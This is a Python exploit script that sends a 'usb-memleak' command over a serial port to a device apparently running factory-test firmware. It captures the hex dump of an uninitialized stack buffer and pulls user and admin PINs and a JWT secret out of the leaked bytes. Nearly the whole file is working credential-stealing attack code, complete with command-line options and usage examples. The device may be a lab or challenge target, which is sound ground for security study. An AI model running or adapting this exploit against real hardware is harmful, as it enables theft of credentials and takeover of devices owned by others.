#!/usr/bin/env python3
"""
USB Memory Leak Exploit - Extract credentials from uninitialized buffer.

Sends the "usb-memleak" command over serial to trigger a stack buffer
leak from the UsbStatus struct. The first 2 bytes (status, version) are
initialized; bytes 2-63 contain leaked secrets copied from device config
(user_pin, admin_pin, JWT secret).

Requires: pyserial (pip install pyserial)
"""

import argparse
import re
import sys
import time


def open_serial(port, baud):
    """Open serial port, exit on failure."""
    try:
        import serial
    except ImportError:
        print("ERROR: pyserial is required. Install with: pip install pyserial",
              file=sys.stderr)
        sys.exit(1)

    try:
        ser = serial.Serial(port, baud, timeout=3)
    except serial.SerialException as e:
        print(f"ERROR: Could not open {port}: {e}", file=sys.stderr)
        sys.exit(1)

    return ser


def trigger_memleak(ser):
    """Send usb-memleak command and capture hex dump output."""
    # Flush pending data
    time.sleep(0.5)
    ser.read(ser.in_waiting)

    print("[*] Sending usb-memleak command...")
    ser.write(b"usb-memleak\r\n")

    # Collect response lines
    time.sleep(1.5)
    raw = ser.read(ser.in_waiting)
    output = raw.decode("utf-8", errors="replace")
    return output


def parse_hex_dump(output):
    """Extract hex bytes from the serial output."""
    # Match lines containing hex byte sequences like "01 01 75 73 65 72..."
    hex_pattern = r"([0-9A-Fa-f]{2}(?:\s+[0-9A-Fa-f]{2})+)"
    matches = re.findall(hex_pattern, output)

    if not matches:
        return None

    all_hex = " ".join(matches)
    hex_bytes = [int(h, 16) for h in all_hex.split()]
    return hex_bytes


def decode_leaked_data(hex_bytes):
    """Decode the leaked bytes (skip first 2: status + version)."""
    if len(hex_bytes) < 3:
        return None, {}

    status_byte = hex_bytes[0]
    version_byte = hex_bytes[1]

    # Leaked data starts at byte 2 (the uninitialized reserved[] field)
    leaked_raw = bytes(hex_bytes[2:])
    leaked_str = leaked_raw.decode("utf-8", errors="ignore").rstrip("\x00")

    # Parse key=value pairs separated by semicolons
    credentials = {}
    for pair in leaked_str.split(";"):
        pair = pair.strip()
        if "=" in pair:
            key, value = pair.split("=", 1)
            credentials[key.strip()] = value.strip()

    return leaked_str, credentials


def main():
    parser = argparse.ArgumentParser(
        description="USB memory leak exploit - extract credentials from "
                    "uninitialized stack buffer via usb-memleak serial command.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s
      Send usb-memleak on /dev/ttyACM0, decode and display credentials

  %(prog)s --port /dev/ttyUSB0 --baud 9600
      Use a different serial port and baud rate

  %(prog)s --output dump.bin
      Save the raw hex dump bytes to a file

  %(prog)s --decode
      Show full ASCII decode of the leaked buffer alongside credentials

  %(prog)s --output dump.bin --decode
      Save raw dump and show decoded ASCII output
""")
    parser.add_argument("--port", "-p", default="/dev/ttyACM0",
                        help="Serial port (default: /dev/ttyACM0)")
    parser.add_argument("--baud", "-b", type=int, default=115200,
                        help="Baud rate (default: 115200)")
    parser.add_argument("--output", "-o",
                        help="Save raw hex dump bytes to file")
    parser.add_argument("--decode", "-d", action="store_true",
                        help="Show full ASCII decode of the leaked buffer")

    args = parser.parse_args()

    ser = open_serial(args.port, args.baud)

    try:
        output = trigger_memleak(ser)
    finally:
        ser.close()

    print("[*] Raw serial output:")
    print(output)

    hex_bytes = parse_hex_dump(output)
    if hex_bytes is None:
        print("[-] No hex data found in output.", file=sys.stderr)
        print("    Make sure the device is running FACTORY_TEST firmware and")
        print("    the usb-memleak command is available (check 'help').")
        sys.exit(1)

    print(f"[*] Captured {len(hex_bytes)} bytes")
    print(f"[*] Status byte:  0x{hex_bytes[0]:02X}")
    print(f"[*] Version byte: 0x{hex_bytes[1]:02X}")

    # Save raw dump if requested
    if args.output:
        raw_data = bytes(hex_bytes)
        with open(args.output, "wb") as f:
            f.write(raw_data)
        print(f"[*] Raw dump saved to {args.output} ({len(raw_data)} bytes)")

    # Show full ASCII decode if requested
    if args.decode:
        leaked_raw = bytes(hex_bytes[2:])
        print()
        print("[*] Full ASCII decode of leaked buffer (bytes 2-63):")
        printable = ""
        for b in leaked_raw:
            if 0x20 <= b < 0x7F:
                printable += chr(b)
            elif b == 0x00:
                printable += "."
            else:
                printable += "?"
        print(f"    {printable}")

    # Decode and extract credentials
    leaked_str, credentials = decode_leaked_data(hex_bytes)

    if leaked_str:
        print()
        print(f"[+] Leaked data string: {leaked_str}")

    if credentials:
        print()
        print(f"[+] Extracted {len(credentials)} credential(s):")
        for key, value in credentials.items():
            print(f"    {key} = {value}")
        print()
        print("[+] Memory leak exploit complete.")
    else:
        print()
        print("[-] No key=value credentials found in leaked buffer.")
        print("    The buffer may contain different residual stack data.")
        sys.exit(1)


if __name__ == "__main__":
    main()
